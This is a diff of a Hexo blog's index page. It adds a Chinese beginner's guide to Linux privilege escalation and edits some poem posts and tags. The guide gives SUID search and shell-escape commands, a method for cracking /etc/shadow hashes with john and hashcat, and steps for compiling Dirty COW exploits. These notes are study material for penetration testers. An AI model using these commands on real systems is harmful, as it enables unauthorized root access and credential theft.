@@ -484,6 +484,124 @@
 
 
   
+    <article id="post-linux提权之新手指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/08/linux提权之新手指南/">linux提权之新手指南</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/08/linux提权之新手指南/" class="archive-article-date">
+  	<time datetime="2018-09-08T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这篇文章主要是给自己做个笔记，方便提权时漏掉一些东西，也适合小白吧！</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"><span class="comment">#查看当前用户权限</span></span><br><span class="line"></span><br><span class="line">uname -a </span><br><span class="line"><span class="comment">#Linux - 内核名</span></span><br><span class="line"><span class="comment">#audit - 主机名</span></span><br><span class="line"><span class="comment">#2.6.18-128.el5 - 内核版本</span></span><br><span class="line"><span class="comment">#1 SMP Wed Jan 21 10:41:14 ....2009 - 内核编译日期</span></span><br><span class="line"><span class="comment">#x86_64 - 操作系统版本</span></span><br><span class="line"><span class="comment">#x86_64 - 处理器类型</span></span><br><span class="line"><span class="comment">#x86_64 - 硬件平台</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#举个例子：</span></span><br><span class="line">4.4.0-161-generic  </span><br><span class="line"><span class="comment">#主版本.次版本.释出版本-修改版本</span></span><br><span class="line"></span><br><span class="line">cat /proc/version</span><br><span class="line"><span class="comment">#同 uname -a的作用</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="searchsploit的使用"><a href="#searchsploit的使用" class="headerlink" title="searchsploit的使用"></a>searchsploit的使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例子如下，自己去学参数语法，不过一般下面这几句就够了</span></span><br><span class="line">searchsploit linux priv esc 4.4 ubuntu 16  <span class="comment">#priv esc 是为了匹配Privilege Escalation 即提权 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用--exclude=选项删除不想要的结果</span></span><br><span class="line">searchsploit smb windows remote --exclude=<span class="string">"(POC)|txt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索包含abcd的漏洞标题，默认不加参数即 -t 参数 空格隔开就犹如百度搜索的空格隔开</span></span><br><span class="line">searchsploit -t abcd</span><br></pre></td></tr></table></figure>
+
+<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>一般服务器不会安装乱七八糟的其他应用，所以一般不会有suid提权，但是也不可掉以轻心。因为提权就是要搜集信息，想尽一切办法。<br>常见可用于suid提权的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap</span><br><span class="line"></span><br><span class="line">Vim</span><br><span class="line"></span><br><span class="line">find</span><br><span class="line"></span><br><span class="line">Bash</span><br><span class="line"></span><br><span class="line">More</span><br><span class="line"></span><br><span class="line">Less</span><br><span class="line"></span><br><span class="line">Nano</span><br><span class="line"></span><br><span class="line">cp</span><br></pre></td></tr></table></figure>
+
+<p>下面一一介绍各个工具的执行系统命令的例子。</p>
+<p>查找符合条件的文件命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找root权限的suid可执行文件</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p><strong>提权示例</strong><br><strong>nmap</strong><br>老版的nmap(2.02-5.21)有相互的功能–interactive</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><strong>msf中也有相关的模块</strong><br>exploit/unix/local/setuid_nmap<br>find<br>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br><span class="line">vim</span><br></pre></td></tr></table></figure>
+
+<p><strong>vim</strong><br>如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim/vi</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>bash</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">&gt;<span class="comment"># id</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>less/more</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>有时候密码简单的时候也可以进行暴力破解，但是局限性也是有的 root才能读取shadow，但是有时候网站配置不当我们可以读取或者网站的一些敏感的信息泄露。</p>
+<p>暴力破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># john 利用默认字典爆破，这里的shadow放置hash即可也可写入完整/etc/shadow内容</span></span><br><span class="line">john --wordlist=/usr/share/john/password.lst ./shadow</span><br><span class="line"><span class="comment">#执行完毕后查看破解出的明文密码</span></span><br><span class="line">john --show ./shadow</span><br><span class="line"></span><br><span class="line"><span class="comment">#hashcat 这里的shadow放置完善的hash即可</span></span><br><span class="line">hashcat -m 1800 -o found1.txt --remove shadow /usr/share/john/password.lst </span><br><span class="line"><span class="comment">#此处需要把linux 密码的hash提取出来放到一个文档重 然后查看输出 found1.txt即可</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mimipenguin"><a href="#mimipenguin" class="headerlink" title="mimipenguin"></a>mimipenguin</h4><p>和mimikatz 一样 从内存读取密码，但是也是需要很高的权限，很少用。</p>
+<h4 id="计划任务-cron"><a href="#计划任务-cron" class="headerlink" title="计划任务 - cron"></a>计划任务 - cron</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
+
+<p>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连rootshell了，当然几率也比较小。</p>
+<h4 id="exp编译"><a href="#exp编译" class="headerlink" title="exp编译"></a>exp编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般的exp编译</span></span><br><span class="line">gcc test.c -o <span class="built_in">test</span></span><br><span class="line"><span class="comment">#dirtycow exp 编译</span></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+
+<h4 id="常用的exp"><a href="#常用的exp" class="headerlink" title="常用的exp"></a>常用的exp</h4><p><strong>dirty-cow</strong><br>漏洞范围：<br>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复，所以如果看到内核编译日期是2017年以后的一般不考虑脏牛提权）<br>EXP地址：<br>1、<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a>  # 推荐用这个<br>2、<a href="https://github.com/gbonacini/CVE-2016-5195" target="_blank" rel="noopener">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、gcc -pthread dirty.c -o dirty -lcrypt #1的exp -lcrypt 是调用crypt库进行编译就要加 -lcrypt -pthread同理</span><br><span class="line">2、make  #2的exp直接make</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意:</strong> dirtycow是通过修改root的用户名密码进行提权的，所以一定要记住备份原来的/etc/passwd，方便及时恢复。</p>
+<p><strong>CVE-2010-3904</strong><br>漏洞范围:<br>Linux Kernel &lt;= 2.6.36-rc8 RDS privilege escalation exploit<br>CVE-2010-3904</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 15285.c -o 15285</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/08/linux提权之新手指南/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-浅谈PHP的反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -794,94 +912,20 @@
 
 
   
-    <article id="post-传信者" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-深夜十二点" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/1997/01/01/传信者/">传信者</a>
+      <a class="article-title" href="/1997/01/02/深夜十二点/">深夜12点</a>
     </h1>
   
 
         
-        <a href="/1997/01/01/传信者/" class="archive-article-date">
-  	<time datetime="1996-12-31T16:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>1997-01-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>我本想托月亮带话给你<br>但今夜无月<br>我又等不到太阳出来<br>只能托这清风<br>又怕你在屋里<br>只能多多嘱咐清风<br>让他万万要吹到屋里<br>吹在你的耳边</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/1997/01/01/传信者/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-渴望" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/1997/01/01/渴望/">深夜12点</a>
-    </h1>
-  
-
-        
-        <a href="/1997/01/01/渴望/" class="archive-article-date">
-  	<time datetime="1996-12-31T16:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>1997-01-01</time>
+        <a href="/1997/01/02/深夜十二点/" class="archive-article-date">
+  	<time datetime="1997-01-01T16:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>1997-01-02</time>
 </a>
         
       </header>
@@ -893,7 +937,7 @@
 <p>我在我的出租屋房</p>
 <p>我在我的台灯下写</p>
         
-          <a class="article-more-a" href="/1997/01/01/渴望/#more">more >></a>
+          <a class="article-more-a" href="/1997/01/02/深夜十二点/#more">more >></a>
         
       
 
@@ -917,7 +961,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/1997/01/01/渴望/">展开全文 >></a>
+          <a class="article-more-a" href="/1997/01/02/深夜十二点/">展开全文 >></a>
         </p>
       
 
@@ -947,6 +991,10 @@
 
 
   
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
@@ -1041,11 +1089,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">app</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网安全</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1053,11 +1101,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color4">app</a>
               </li>
              
               <li class="article-tag-list-item">
